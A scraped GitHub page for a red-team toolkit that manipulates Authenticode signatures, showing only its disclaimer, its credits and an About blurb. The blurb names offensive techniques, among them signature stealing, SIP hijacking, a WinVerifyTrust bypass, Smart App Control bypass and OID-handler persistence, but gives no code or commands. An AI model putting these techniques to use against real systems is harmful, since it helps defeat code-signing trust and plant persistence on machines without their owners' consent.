This tool is for educational purposes and authorized security testing only. Misuse to attack systems without consent is illegal. The authors are not responsible for damage caused by this software.

## Credits

[Permalink: Credits](https://github.com/KriyosArcane/TrustMeBro/#credits)

- [SigFlip](https://github.com/med0x2e/SigFlip) by med0x2e. Payload embedding via certificate table padding (CVE-2013-3900).
- [SignatureKid](https://github.com/dslee2022/SignatureKid) by David Lee. Signature stealing research.
- [MetaTwin](https://github.com/threatexpress/metatwin) by ThreatExpress. Binary metadata cloning.
- Matt Graeber. SIP and Trust Provider research documenting the WVT hijack attack surface.

## About

Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, SIP execution surface implants, Smart App Control Bypass, and analyst-triggered persistence via OID handlers.

### Resources

[Readme](https://github.com/KriyosArcane/TrustMeBro/#readme-ov-file)

[MIT license](https://github.com/KriyosArcane/TrustMeBro/#MIT-1-ov-file)

[Activity](https://github.com/KriyosArcane/TrustMeBro/activity)

### Stars

**122** stars

### Watchers

**0** watching

### Forks

[**16** forks](https://github.com/KriyosArcane/TrustMeBro/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FKriyosArcane%2FTrustMeBro&report=KriyosArcane+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.